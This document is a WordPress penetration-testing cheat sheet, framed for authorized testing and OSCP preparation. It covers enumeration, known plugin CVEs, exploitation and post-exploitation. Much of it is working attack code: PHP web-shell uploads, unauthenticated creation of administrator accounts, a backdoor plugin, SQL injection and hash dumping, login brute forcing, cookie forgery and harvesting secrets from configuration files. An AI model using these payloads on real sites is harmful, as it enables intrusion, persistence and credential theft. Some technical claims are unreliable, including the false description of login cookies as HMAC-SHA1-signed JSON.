# WordPress

> WordPress CMS reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### HTML markers

```bash
curl -s http://<TARGET>/ | grep -iE 'wp-content|wp-includes|wordpress'
```

Expected output:

```html
<link rel="stylesheet" href="/wp-content/themes/twentytwentyfour/style.css">
<script src="/wp-includes/js/wp-embed.min.js"></script>
<meta name="generator" content="WordPress 6.4.2" />
```

Three strong fingerprints:
- `/wp-content/` and `/wp-includes/` paths
- `<meta name="generator" content="WordPress x.y.z" />`
- `/wp-json/` REST API endpoints

### Response headers

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|x-powered-by|link|x-pingback)'
```

Expected output:

```text
Link: <http://target/wp-json/>; rel="https://api.w.org/"
X-Pingback: http://target/xmlrpc.php
```

`X-Pingback` header and `wp-json` link header are definitive.

### Default files

- `/wp-login.php` - login page
- `/wp-admin/` - admin dashboard (redirects to wp-login.php)
- `/wp-json/` - REST API root
- `/xmlrpc.php` - XML-RPC endpoint
- `/wp-cron.php` - scheduled tasks
- `/readme.html` - **version disclosure** (many installs forget to remove)
- `/license.txt` - WordPress license
- `/wp-config.php` - **never served** (PHP file), but `.bak` / `.old` may leak

### readme.html version check

```bash
curl -s http://<TARGET>/readme.html | grep -oE 'Version [0-9.]+'
```

### /wp-json/ version

```bash
curl -s http://<TARGET>/wp-json/ | jq .name,.description,.url
```

### nmap / whatweb

```bash
nmap -sV -p 80,443 --script http-wordpress-enum,http-wordpress-users <TARGET>
whatweb -a 3 http://<TARGET>/
wpscan --url http://<TARGET>/ --enumerate vp,vt,u
```

### wpscan (essential)

```bash
wpscan --url http://<TARGET>/ \
  --enumerate vp,vt,u,cb,dbe \
  --api-token <YOUR_WPSCAN_TOKEN> \
  --plugins-detection aggressive \
  --random-user-agent
```

WPScan enumerates: vulnerable plugins (vp), vulnerable themes (vt), users (u),
config backups (cb), DB exports (dbe).

---

## 2. Enumeration

### Version

```bash
# Method 1: meta generator
curl -s http://<TARGET>/ | grep -oE 'WordPress [0-9.]+'

# Method 2: readme.html
curl -s http://<TARGET>/readme.html | grep -oE 'Version [0-9.]+'

# Method 3: RSS feed generator
curl -s http://<TARGET>/feed/ | grep -oE '<generator>[^<]+</generator>'

# Method 4: CSS/JS version query strings
curl -s http://<TARGET>/ | grep -oE 'ver=[0-9.]+'

# Method 5: /wp-json/
curl -s http://<TARGET>/wp-json/ | jq .namespaces
```

### User enumeration

Multiple methods:

**1. Author archive (`?author=N`):**

```bash
for i in 1 2 3 4 5; do
  curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "http://<TARGET>/?author=$i"
done
```

Redirect to `/author/<username>/` reveals the username.

**2. REST API:**

```bash
curl -s http://<TARGET>/wp-json/wp/v2/users | jq '.[].slug'
curl -s http://<TARGET>/wp-json/wp/v2/users | jq '.[] | {id, name, slug}'
```

**3. WP-JSON oEmbed:**

```bash
curl -s "http://<TARGET>/wp-json/oembed/1.0/embed?url=http://<TARGET>/"
```

**4. Sitemap:**

```bash
curl -s http://<TARGET>/wp-sitemap.xml
curl -s http://<TARGET>/wp-sitemap-users-1.xml
```

**5. Login error messages:**

WordPress reveals if a username exists:

```bash
curl -s -X POST http://<TARGET>/wp-login.php \
  -d "log=admin&pwd=wrong"
# "The password you entered for the username admin is incorrect" -> user exists
# "Unknown username" -> user does not exist
```

**6. RSS feed:**

```bash
curl -s http://<TARGET>/feed/ | grep -oE '<dc:creator>[^<]+</dc:creator>'
```

### Plugin enumeration

**1. Passive (HTML source):**

```bash
curl -s http://<TARGET>/ | grep -oE '/wp-content/plugins/[^/]+/' | sort -u
```

**2. Aggressive (wpscan):**

```bash
wpscan --url http://<TARGET>/ --enumerate ap --plugins-detection aggressive
```

**3. Manual brute force (common plugins):**

```bash
for p in woocommerce contact-form-7 elementor wordpress-seo jetpack akismet \
         litespeed-cache wpforms-lite really-simple-ssl wordfence; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/wp-content/plugins/$p/readme.txt")
  echo "$code  $p"
done
```

Reading `readme.txt` gives plugin version:

```bash
curl -s http://<TARGET>/wp-content/plugins/<plugin>/readme.txt | grep -i 'stable tag'
```

### Theme enumeration

```bash
curl -s http://<TARGET>/ | grep -oE '/wp-content/themes/[^/]+/' | sort -u
curl -s http://<TARGET>/wp-content/themes/<theme>/style.css | grep -i 'version:'
```

### /wp-json/ endpoint enumeration

The REST API exposes many endpoints:

```bash
curl -s http://<TARGET>/wp-json/ | jq '.routes | keys[]'
```

Common sensitive endpoints:

```bash
curl -s http://<TARGET>/wp-json/wp/v2/users
curl -s http://<TARGET>/wp-json/wp/v2/posts
curl -s http://<TARGET>/wp-json/wp/v2/pages
curl -s http://<TARGET>/wp-json/wp/v2/comments
curl -s http://<TARGET>/wp-json/wp/v2/settings  # requires auth
```

### XML-RPC enumeration

```bash
curl -s http://<TARGET>/xmlrpc.php -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' | head -c 500
```

Enabled methods: `wp.getUsersBlogs`, `system.multicall` (brute force amplifier).

### wp-cron enumeration

```bash
curl -sI http://<TARGET>/wp-cron.php
```

If reachable, cron jobs can be triggered externally (DoS or job abuse).

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.txt -x php,txt,bak,old,sql,zip
```

Seclists has WordPress-specific wordlists:

- `Discovery/Web-Content/CMS/wordpress.txt`
- `Discovery/Web-Content/CMS/wp-plugins.fuzz.txt`
- `Discovery/Web-Content/CMS/wp-themes.fuzz.txt`

### Config backup enumeration

```bash
for f in wp-config.php.bak wp-config.php.old wp-config.php~ wp-config.php.save \
         wp-config.php.swp wp-config.txt wp-config.php.orig .wp-config.php.swp \
         wp-config.php.disabled; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Database export enumeration

```bash
for f in backup.sql database.sql dump.sql wordpress.sql wp-db.sql \
         backup.zip backup.tar.gz wordpress.zip wp-content.zip; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

---

## 3. Known CVEs

WordPress core is well-maintained. Most CVEs live in plugins/themes. Below
are high-impact core and widely-used plugin CVEs.

### Core CVEs

#### CVE-2019-8942 / CVE-2019-8943 - Path traversal + RCE via image metadata

Authenticated attacker with `upload_files` capability can upload crafted image
with malicious metadata -> path traversal + RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-8942
NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-8943
Affected: WordPress 5.0.0 (and 4.9.x).

#### CVE-2018-20148 - Media element XSS

Authenticated XSS in media upload metadata.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-20148
Affected: WordPress 5.0.1 and earlier.

#### CVE-2021-29447 - XXE in media library

Authenticated XXE via crafted WAV file upload.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-29447
Affected: WordPress 5.6.0 - 5.6.2, 5.7.0.

#### CVE-2023-2745 - Directory traversal in i18n

Unauthenticated directory traversal via `wp-includes/class-wp-block-parser.php`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-2745
Affected: WordPress 6.2.0.

#### CVE-2024-31210 - Admin RCE via plugin upload

Authenticated admin can upload a plugin ZIP with a traversal filename -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-31210
Affected: WordPress < 6.4.3, < 6.3.3.

### Popular plugin CVEs

#### CVE-2020-25213 - File Manager plugin RCE

**Extremely common** in CTFs. `wp-file-manager` plugin <= 6.8 allows
unauthenticated file upload to webroot -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-25213
Affected: wp-file-manager <= 6.8.

PoC:

```bash
# Detect
curl -s -o /dev/null -w "%{http_code}\n" http://<TARGET>/wp-content/plugins/wp-file-manager/readme.txt

# Exploit
curl -s "http://<TARGET>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -F "upload[]=@shell.php" -F "cmd=upload" | jq .
```

#### CVE-2023-28121 - WooCommerce Payments auth bypass

Critical. Unauthenticated privilege escalation to admin.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-28121
Affected: WooCommerce Payments 4.8.0 - 5.6.1.

PoC:

```bash
curl -X POST http://<TARGET>/wp-json/wp/v2/users \
  -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
  -d '{"username":"newadmin","email":"a@b.com","password":"pwned","roles":["administrator"]}'
```

#### CVE-2023-6553 - Backup Migration plugin RCE

Unauthenticated RCE via PHP filter chain.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-6553
Affected: Backup Migration < 1.3.8.

PoC:

```bash
curl -X POST http://<TARGET>/wp-content/plugins/backup-backup/includes/backup-heart.php \
  -H "Content-Dir: <?php system(\$_GET['cmd']); ?>"
```

#### CVE-2024-1071 - Ultimate Member SQLi

Unauthenticated SQL injection via `sorting` parameter.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-1071
Affected: Ultimate Member 2.1.3 - 2.8.2.

PoC:

```bash
curl "http://<TARGET>/?um_search=1&sorting=user_login' OR 1=1-- -"
```

#### CVE-2024-27956 - WP Automatic SQLi

Unauthenticated SQL injection in `wp-automatic` -> admin creation.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-27956
Affected: WP Automatic < 3.92.1.

PoC (mass exploitation observed in the wild):

```bash
curl -X POST "http://<TARGET>/wp-content/plugins/wp-automatic/inc/csv.php" \
  -d "q=SELECT * FROM wp_users" --data-urlencode "auth=%00&integ=1&integ2=2"
```

#### CVE-2024-25600 - Bricks Builder RCE

Unauthenticated RCE in Bricks Builder theme.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-25600
Affected: Bricks Builder <= 1.9.6.

PoC:

```bash
# 1. Get nonce
curl -s http://<TARGET>/wp-json/bricks/v1/render_element

# 2. POST payload
curl -X POST http://<TARGET>/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{"postId":"1","nonce":"<nonce>","element":{"name":"code","settings":{"code":"<?php system(\$_GET[\"cmd\"]); ?>"}}}'
```

#### CVE-2024-10924 - Really Simple SSL auth bypass

Unauthenticated auth bypass via REST API.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-10924
Affected: Really Simple SSL < 9.1.1.1.

PoC:

```bash
curl -X POST "http://<TARGET>/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding" \
  -H "Content-Type: application/json" \
  -d '{"user_id":1,"login_nonce":"any","redirect_to":"/wp-admin/"}'
```

#### CVE-2024-11972 - Hunk Companion plugin install

Unauthenticated plugin install -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-11972
Affected: Hunk Companion < 1.9.0.

#### CVE-2021-34693 - Contact Form 7 unrestricted file upload

NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-34693
Affected: Contact Form 7 < 5.3.2 (with specific configs).

#### CVE-2022-1029 - Elementor Pro RCE

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-1029
Affected: Elementor Pro <= 3.6.2.

#### CVE-2022-1329 - Elementor Pro auth bypass + RCE

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-1329
Affected: Elementor Pro 3.6.0 - 3.6.3.

#### CVE-2023-6875 - POST SMTP auth bypass

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-6875
Affected: POST SMTP < 2.8.7.

### Version -> CVE quick table (core)

| Version | Type | CVE |
|---------|------|-----|
| 5.0.0 | Image metadata RCE | CVE-2019-8942 / 8943 |
| 5.0.1 and earlier | Media XSS | CVE-2018-20148 |
| 5.6.0-5.6.2, 5.7.0 | XXE | CVE-2021-29447 |
| 6.2.0 | Directory traversal | CVE-2023-2745 |
| < 6.4.3, < 6.3.3 | Admin RCE | CVE-2024-31210 |

### Version -> CVE quick table (plugins)

| Plugin | Version | CVE |
|--------|---------|-----|
| wp-file-manager | <= 6.8 | CVE-2020-25213 |
| WooCommerce Payments | 4.8.0-5.6.1 | CVE-2023-28121 |
| Backup Migration | < 1.3.8 | CVE-2023-6553 |
| Ultimate Member | 2.1.3-2.8.2 | CVE-2024-1071 |
| WP Automatic | < 3.92.1 | CVE-2024-27956 |
| Bricks Builder | <= 1.9.6 | CVE-2024-25600 |
| Really Simple SSL | < 9.1.1.1 | CVE-2024-10924 |

---

## 4. Exploitation Patterns

### Default credentials

WordPress does not ship default credentials. But common:

- `admin` / `admin`
- `admin` / `password`
- `admin` / `administrator`
- `admin` / `wordpress`
- `admin` / `changeme`

Brute force:

```bash
wpscan --url http://<TARGET>/ \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack wp-login

# Or use hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"
```

Rate limiting is common; use `--max-threads 1` and `--throttle`.

### XML-RPC brute force amplification

`system.multicall` allows ~1000 passwords per request:

```bash
# WPScan XML-RPC
wpscan --url http://<TARGET>/ -U admin -P rockyou.txt --password-attack xmlrpc
```

### wp-file-manager RCE (CVE-2020-25213)

Very common in CTFs.

```bash
# Detect plugin version
curl -s http://<TARGET>/wp-content/plugins/wp-file-manager/readme.txt | grep -i 'stable tag'

# Upload PHP
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -s "http://<TARGET>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -F "upload[]=@shell.php" -F "cmd=upload" | jq .

# Find uploaded file
curl -s "http://<TARGET>/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

### Authenticated RCE via theme/plugin editor

With admin creds:

1. Navigate to `Appearance -> Theme File Editor`
2. Edit `functions.php` or any theme file
3. Insert PHP code
4. Trigger the theme

Or via plugin editor: `Plugins -> Plugin File Editor`.

Or upload a new plugin ZIP:

```bash
mkdir -p evil
cat > evil/evil.php << 'EOF'
<?php
/**
 * Plugin Name: Evil
 */
add_action('init', function() {
    if (isset($_GET['cmd'])) { system($_GET['cmd']); }
});
EOF
zip -r evil.zip evil/

curl -b "wordpress_logged_in_xxx=<session>" \
  -F "pluginzip=@evil.zip" \
  http://<TARGET>/wp-admin/update.php?action=upload-plugin
```

Metasploit:

```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target>
set USERNAME admin
set PASSWORD <password>
run
```

### WooCommerce Payments auth bypass (CVE-2023-28121)

```bash
curl -X POST http://<TARGET>/wp-json/wp/v2/users \
  -H "X-WCPAY-PLATFORM-CHECKOUT-USER: 1" \
  -H "Content-Type: application/json" \
  -d '{"username":"newadmin","email":"a@b.com","password":"pwned","roles":["administrator"]}'
```

Then log in with `newadmin:pwned`.

### Bricks Builder RCE (CVE-2024-25600)

```bash
# Step 1: fetch the nonce (unauthenticated)
NONCE=$(curl -s http://<TARGET>/wp-json/bricks/v1/render_element | jq -r .data.nonce)
echo $NONCE

# Step 2: RCE
curl -X POST http://<TARGET>/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d "{\"postId\":\"1\",\"nonce\":\"$NONCE\",\"element\":{\"name\":\"code\",\"settings\":{\"code\":\"<?php system(\$_GET['cmd']); ?>\"}}}"
```

### SQL injection in plugins

Plugin SQLi is common. Example (Ultimate Member CVE-2024-1071):

```bash
curl "http://<TARGET>/?um_search=1&sorting=user_login' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -"
```

Extract admin hashes:

```bash
sqlmap -u "http://<TARGET>/?um_search=1&sorting=1" --dbms=mysql -T wp_users -C user_login,user_pass --dump
```

### XXE in media upload (CVE-2021-29447)

Requires authenticated upload capability. Public PoC:

https://github.com/motikan2010/CVE-2021-29447

### Deserialization in plugins

Search for `unserialize()` in plugin source. Craft with PHPGGC:

```bash
phpggc Monolog/RCE1 system 'id' -o payload.bin
```

### REST API user creation (with admin session)

```bash
curl -X POST http://<TARGET>/wp-json/wp/v2/users \
  -H "Content-Type: application/json" \
  -b "wordpress_logged_in_xxx=<session>" \
  -d '{"username":"attacker","password":"pwned","email":"a@b.com","roles":["administrator"]}'
```

### Post-auth RCE via media upload

With `upload_files` capability (Editor role):

1. Upload `.php.jpg` via media library
2. If uploads `.htaccess` allows PHP execution:

```bash
curl -b "<session>" -F "async-upload=@shell.php.jpg" \
  http://<TARGET>/wp-admin/async-upload.php
```

---

## 5. Misconfigurations

### Directory listing

```bash
curl -s http://<TARGET>/wp-content/uploads/ | grep -i 'index of'
curl -s http://<TARGET>/wp-content/plugins/ | grep -i 'index of'
```

### wp-config.php exposure

```bash
for f in wp-config.php.bak wp-config.php.old wp-config.php~ wp-config.php.swp \
         wp-config.php.save wp-config.php.txt wp-config.php.orig; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Backup files in webroot

```bash
for f in backup.zip backup.tar.gz wordpress.zip wp-content.zip dump.sql \
         database.sql wordpress.sql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### readme.html not deleted

```bash
curl -s http://<TARGET>/readme.html | grep -oE 'Version [0-9.]+'
```

### XML-RPC enabled

```bash
curl -sI http://<TARGET>/xmlrpc.php | head -1
```

### User registration enabled

```bash
curl -s http://<TARGET>/wp-login.php?action=register | grep -i 'register'
```

### REST API user enumeration

```bash
curl -s http://<TARGET>/wp-json/wp/v2/users | jq '.[].slug'
```

### Vulnerable plugins

```bash
wpscan --url http://<TARGET>/ --enumerate vp --api-token <token>
```

### Missing security headers

```bash
curl -sI http://<TARGET>/ | grep -iE 'strict-transport|content-security-policy|x-frame-options'
```

### Debug mode (WP_DEBUG=true)

```bash
curl -s http://<TARGET>/ | grep -i 'warning\|notice\|deprecated'
```

### wp-cron.php publicly accessible

```bash
curl -sI http://<TARGET>/wp-cron.php
```

---

## 6. Post-Exploitation

### Config file location

```bash
cat /var/www/html/wp-config.php
```

Key items:

- `DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST` -> DB access
- `AUTH_KEY`, `SECURE_AUTH_KEY`, `LOGGED_IN_KEY`, `NONCE_KEY` -> cookie forgery
- `AUTH_SALT`, `SECURE_AUTH_SALT`, `LOGGED_IN_SALT`, `NONCE_SALT`
- `WP_DEBUG` (true -> errors + stack traces)
- Custom defines (plugin settings, API keys)

### Database access

```bash
mysql -h <DB_HOST> -u <DB_USER> -p<DB_PASSWORD> <DB_NAME>
```

Dump users:

```sql
SELECT ID, user_login, user_pass, user_email, user_status FROM wp_users;
SELECT user_id, meta_key, meta_value FROM wp_usermeta
WHERE meta_key LIKE 'wp_capabilities' OR meta_key LIKE 'wp_user_level';
```

`wp_capabilities` is a serialized PHP array:

```text
a:1:{s:13:"administrator";b:1;}
```

### Cracking WordPress hashes

WordPress uses phpass (portable PHP hash). Format:

```text
$P$B<8-char-salt><22-char-hash>
```

Hashcat mode 400:

```bash
hashcat -m 400 wp_hashes.txt rockyou.txt
john --format=phpass wp_hashes.txt
```

### Authentication key cookie forgery

With `AUTH_KEY` / `SECURE_AUTH_KEY` from leaked wp-config.php, forge the
`wordpress_logged_in_<hash>` cookie:

```bash
git clone https://github.com/kaisunc/wp-cookie-forge
python wp-cookie-forge/forge.py \
  --auth-key '<AUTH_KEY>' \
  --secure-auth-key '<SECURE_AUTH_KEY>' \
  --logged-in-key '<LOGGED_IN_KEY>' \
  --user-id 1 \
  --username admin
```

The forged cookie is base64-encoded JSON with an HMAC-SHA1 signature. Set as:

```bash
curl -b "wordpress_logged_in_<hash>=<forged>" http://<TARGET>/wp-admin/
```

### Plugin / theme code review (source access)

```bash
# Find suspicious patterns
grep -rE 'eval\(|system\(|exec\(|passthru\(|shell_exec\(' /var/www/html/wp-content/plugins/ 2>/dev/null | head -20
grep -rE 'unserialize\(' /var/www/html/wp-content/plugins/ 2>/dev/null | head -20
grep -rE 'mysql_query|->query\(' /var/www/html/wp-content/plugins/ 2>/dev/null | head -20

# Find API keys
grep -rE 'sk_live|AKIA|AIza|ghp_|glpat-' /var/www/html/ 2>/dev/null
```

### Admin dashboard -> full server RCE

With admin access:

1. `Appearance -> Theme File Editor -> functions.php`
2. Insert:

```php
<?php
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
```

3. Trigger: `http://<TARGET>/?cmd=id`

### Upload directory analysis

```bash
ls -la /var/www/html/wp-content/uploads/
find /var/www/html/wp-content/uploads/ -type f -newer /var/www/html/wp-config.php 2>/dev/null
```

Look for freshly uploaded PHP files (attacker persistence).

### Log files

```bash
ls -la /var/www/html/wp-content/debug.log
tail -n 200 /var/www/html/wp-content/debug.log

tail -n 200 /var/log/apache2/access.log | grep -i 'wp-login\|xmlrpc'
```

### wp_options -> secrets

```sql
SELECT option_name, option_value FROM wp_options
WHERE option_name LIKE '%api%' OR option_name LIKE '%key%' OR option_name LIKE '%secret%' OR option_name LIKE '%token%';
```

Common: `woocommerce_stripe_settings`, `mailchimp_api_key`, `wpseo`,
`aws_*`, `_transient_*`.

### Session / cookie table

WordPress stores sessions in `wp_usermeta`:

```sql
SELECT user_id, meta_key, meta_value FROM wp_usermeta
WHERE meta_key = 'session_tokens';
```

### Cron jobs -> persistence

```bash
crontab -l
ls -la /etc/cron.d/ /etc/cron.daily/ /var/spool/cron/crontabs/ 2>/dev/null
```

### File permission check

```bash
ls -la /var/www/html/wp-config.php
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the WordPress version (from `<meta name="generator">` OR `/readme.html` OR `/feed/`) - it proves the exact core version.

> [!IMPORTANT]
> OSCP report: for a plugin exploit (e.g. wp-file-manager CVE-2020-25213), screenshot the plugin version from `readme.txt`, the exploit request, AND the resulting command output.

> [!IMPORTANT]
> OSCP report: for wp-config.php leak, screenshot the file content (with DB creds masked) AND at least one successful credential use (DB login or cookie forgery).

---

## 8. References

- WordPress official docs - https://wordpress.org/documentation/
- WordPress security releases - https://wordpress.org/news/category/security/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=wordpress
- WPScan vulnerability database - https://wpscan.com/
- WPScan CLI - https://github.com/wpscanteam/wpscan
- WordPress Exploit Framework - https://github.com/rastating/wordpress-exploit-framework
- CVE-2020-25213 writeup - https://github.com/0xtn/CVE-2020-25213
- CVE-2023-28121 writeup - https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/
- HackTricks - WordPress - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- PHPGGC - https://github.com/ambionics/phpggc

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
